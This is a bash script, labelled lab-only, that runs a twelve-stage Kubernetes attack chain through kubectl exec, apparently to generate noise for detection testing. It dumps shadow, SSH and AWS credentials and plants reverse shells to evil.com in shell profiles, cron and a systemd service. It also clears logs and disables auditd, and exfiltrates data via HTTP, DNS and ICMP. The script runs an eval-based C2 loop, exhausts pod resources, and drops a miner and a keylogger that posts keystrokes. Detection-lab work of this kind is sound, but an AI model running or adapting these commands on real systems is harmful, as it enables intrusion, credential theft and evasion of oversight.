#!/bin/bash

# Advanced script with multiple attack techniques
# Generates lots of noise and suspicious activity

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║           Advanced Attack Techniques Script                  ║"
echo "║                  (Lab Only)                                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")
FIRST_POD=$(echo $PODS | cut -d' ' -f1)

# 1. Credential Dumping
echo -e "${BLUE}[1] Credential Dumping${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Try to read credential files
    cat /etc/passwd 2>/dev/null
    cat /etc/shadow 2>/dev/null || echo 'shadow not accessible'
    cat ~/.ssh/id_rsa 2>/dev/null || echo 'no ssh keys'
    cat ~/.aws/credentials 2>/dev/null || echo 'no aws creds'
    env | grep -i 'pass\|secret\|key\|token' 2>/dev/null
" 2>/dev/null | tee /tmp/creds_dump.txt
echo -e "${GREEN}✓ Credentials dumped${NC}"

# 2. Lateral Movement - Controlled Network Scanning
echo -e "\n${BLUE}[2] Lateral Movement - Network Scanning (limited)${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Limited scan with delays
    COUNT=0
    for svc in \$(kubectl get svc --all-namespaces -o jsonpath='{.items[*].metadata.name}' 2>/dev/null | head -10); do
        for ns in \$(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}' 2>/dev/null | head -5); do
            timeout 1 bash -c \"echo > /dev/tcp/\$svc.\$ns.svc.cluster.local/80\" 2>/dev/null &
            sleep 0.5
            timeout 1 bash -c \"echo > /dev/tcp/\$svc.\$ns.svc.cluster.local/443\" 2>/dev/null &
            sleep 0.5
            COUNT=\$((COUNT + 1))
            if [ \$COUNT -gt 20 ]; then
                wait
                COUNT=0
            fi
        done
    done
    wait
" 2>/dev/null &
echo -e "${GREEN}✓ Network scanning started (limited)${NC}"
sleep 2

# 3. Persistence - Backdoor Creation
echo -e "\n${BLUE}[3] Persistence - Creating Backdoors${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Backdoor in multiple locations
    echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> /root/.bashrc 2>/dev/null
    echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> /root/.profile 2>/dev/null
    echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> /etc/profile 2>/dev/null
    
    # Persistent cron job
    (crontab -l 2>/dev/null; echo '* * * * * curl http://evil.com/c2.sh | bash') | crontab - 2>/dev/null
    
    # Systemd service backdoor
    cat > /tmp/evil.service <<'EOF'
[Unit]
Description=Evil Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    cp /tmp/evil.service /etc/systemd/system/evil.service 2>/dev/null || true
" 2>/dev/null
echo -e "${GREEN}✓ Backdoors created${NC}"

# 4. Defense Evasion - Disable Logging
echo -e "\n${BLUE}[4] Defense Evasion - Disabling Logging${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Clean logs
    > /var/log/auth.log 2>/dev/null || true
    > /var/log/syslog 2>/dev/null || true
    > /var/log/messages 2>/dev/null || true
    
    # Disable auditd if exists
    systemctl stop auditd 2>/dev/null || true
    systemctl disable auditd 2>/dev/null || true
" 2>/dev/null
echo -e "${GREEN}✓ Logging disabled${NC}"

# 5. Collection - Data Harvesting
echo -e "\n${BLUE}[5] Collection - Harvesting Data${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Collect system information
    uname -a > /tmp/system_info.txt
    hostname >> /tmp/system_info.txt
    ip addr >> /tmp/system_info.txt
    ps aux >> /tmp/system_info.txt
    netstat -tulpn >> /tmp/system_info.txt 2>/dev/null || ss -tulpn >> /tmp/system_info.txt
    
    # Collect Kubernetes information
    kubectl get all --all-namespaces > /tmp/k8s_info.txt 2>/dev/null || true
    kubectl get secrets --all-namespaces > /tmp/secrets_list.txt 2>/dev/null || true
    
    # Compress and prepare for exfiltration
    tar czf /tmp/harvest.tar.gz /tmp/*.txt /etc/passwd /etc/hosts 2>/dev/null
" 2>/dev/null
echo -e "${GREEN}✓ Data harvested${NC}"

# 6. Exfiltration - Data Exfiltration
echo -e "\n${BLUE}[6] Exfiltration - Data Exfiltration${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Method 1: HTTP POST
    curl -X POST -F 'file=@/tmp/harvest.tar.gz' http://httpbin.org/post 2>/dev/null &
    
    # Method 2: DNS Exfiltration
    DATA=\$(base64 -w 0 /tmp/harvest.tar.gz 2>/dev/null || base64 /tmp/harvest.tar.gz)
    for chunk in \$(echo \$DATA | fold -w 60); do
        dig \$chunk.evil.com TXT 2>/dev/null &
    done
    
    # Method 3: ICMP Exfiltration
    ping -c 1 -p \$(echo 'EXFIL' | xxd -p) evil.com 2>/dev/null &
" 2>/dev/null &
echo -e "${GREEN}✓ Exfiltration started${NC}"

# 7. Impact - Limited Resource Exhaustion
echo -e "\n${BLUE}[7] Impact - Resource Exhaustion (limited)${NC}"
for POD in $PODS; do
    kubectl exec -it "$POD" -n "$NAMESPACE" -- sh -c "
        # Limited CPU consumption with timeout
        timeout 30 sh -c '
            for i in \$(seq 1 2); do
                timeout 20 sh -c \"while true; do : ; done\" &
            done
            wait
        ' 2>/dev/null || true
        
        # Limited memory consumption
        timeout 20 dd if=/dev/zero of=/tmp/fill bs=1M count=50 2>/dev/null || rm -f /tmp/fill
        
        # Limited disk consumption
        timeout 20 dd if=/dev/urandom of=/tmp/disk_fill bs=1M count=25 2>/dev/null || rm -f /tmp/disk_fill
    " 2>/dev/null &
    sleep 2
done
echo -e "${GREEN}✓ Resource exhaustion started (limited)${NC}"
sleep 2

# 8. Discovery - System Discovery
echo -e "\n${BLUE}[8] Discovery - System Discovery${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # System information
    cat /etc/os-release
    uname -a
    cat /proc/version
    cat /proc/cpuinfo | head -20
    free -h
    df -h
    
    # Network information
    ip route
    arp -a
    cat /etc/resolv.conf
    
    # Kubernetes information
    kubectl cluster-info 2>/dev/null || true
    kubectl get nodes 2>/dev/null || true
    kubectl get namespaces 2>/dev/null || true
" 2>/dev/null | tee /tmp/discovery.txt
echo -e "${GREEN}✓ Discovery completed${NC}"

# 9. Privilege Escalation Attempts
echo -e "\n${BLUE}[9] Privilege Escalation - Escalation Attempts${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Try sudo without password
    sudo -l 2>/dev/null || echo 'sudo not available'
    
    # Find SUID binaries
    find / -perm -4000 2>/dev/null | head -20
    
    # Find capabilities
    getcap -r / 2>/dev/null | head -20 || echo 'getcap not available'
    
    # Try to mount host filesystem
    mkdir -p /host
    mount /dev/sda1 /host 2>/dev/null || mount /dev/vda1 /host 2>/dev/null || echo 'mount failed'
    
    # Access host /proc
    cat /proc/1/environ 2>/dev/null | head -c 500
" 2>/dev/null | tee /tmp/privesc_attempts.txt
echo -e "${GREEN}✓ Escalation attempts executed${NC}"

# 10. Command and Control - Limited C2 Communication
echo -e "\n${BLUE}[10] Command and Control - C2 Communication (limited)${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Limited C2 communication with timeout
    timeout 60 sh -c '
        for i in \$(seq 1 5); do
            COMMAND=\$(curl -s --max-time 2 http://evil.com/command 2>/dev/null || echo \"echo test\")
            eval \$COMMAND 2>/dev/null || true
            sleep 10
        done
    ' 2>/dev/null || true &
    
    # Limited heartbeat with timeout
    timeout 60 sh -c '
        for i in \$(seq 1 6); do
            curl -X POST --max-time 2 -d \"pod=\$(hostname)\" http://evil.com/heartbeat 2>/dev/null || true
            sleep 10
        done
    ' 2>/dev/null || true &
" 2>/dev/null &
echo -e "${GREEN}✓ C2 communication established (limited)${NC}"
sleep 2

# 11. Generate Suspicious Network Traffic
echo -e "\n${BLUE}[11] Generating Suspicious Network Traffic${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Connections to suspicious IPs
    for ip in 1.2.3.4 5.6.7.8 9.10.11.12; do
        for port in 4444 5555 6666 7777; do
            timeout 1 bash -c \"echo > /dev/tcp/\$ip/\$port\" 2>/dev/null &
        done
    done
    
    # Connections to suspicious domains
    for domain in evil.com malware.net c2-server.org; do
        curl -s http://\$domain 2>/dev/null &
        curl -s https://\$domain 2>/dev/null &
    done
" 2>/dev/null &
echo -e "${GREEN}✓ Suspicious traffic generated${NC}"

# 12. Create Malicious Files
echo -e "\n${BLUE}[12] Creating Malicious Files${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Simulated mining script
    cat > /tmp/miner.sh <<'EOF'
#!/bin/sh
while true; do
    dd if=/dev/urandom of=/dev/null bs=1M count=100
    sleep 1
done
EOF
    chmod +x /tmp/miner.sh
    nohup /tmp/miner.sh > /dev/null 2>&1 &
    
    # Simulated keylogger script
    cat > /tmp/keylogger.sh <<'EOF'
#!/bin/sh
while true; do
    cat /dev/input/event* 2>/dev/null | head -c 1000 | base64 | curl -X POST -d @- http://evil.com/keys 2>/dev/null
    sleep 5
done
EOF
    chmod +x /tmp/keylogger.sh
" 2>/dev/null
echo -e "${GREEN}✓ Malicious files created${NC}"

echo -e "\n${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║              Advanced Attacks Executed                         ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo -e "\n${YELLOW}Executed techniques:${NC}"
echo -e "  ✓ Credential Dumping"
echo -e "  ✓ Lateral Movement"
echo -e "  ✓ Persistence"
echo -e "  ✓ Defense Evasion"
echo -e "  ✓ Collection"
echo -e "  ✓ Exfiltration"
echo -e "  ✓ Impact"
echo -e "  ✓ Discovery"
echo -e "  ✓ Privilege Escalation"
echo -e "  ✓ Command and Control"
echo -e "  ✓ Suspicious Network Traffic"
echo -e "  ✓ Malicious Files"
echo -e "\n${YELLOW}Generated files:${NC}"
echo -e "  - /tmp/creds_dump.txt"
echo -e "  - /tmp/discovery.txt"
echo -e "  - /tmp/privesc_attempts.txt"
echo -e "  - /tmp/harvest.tar.gz"
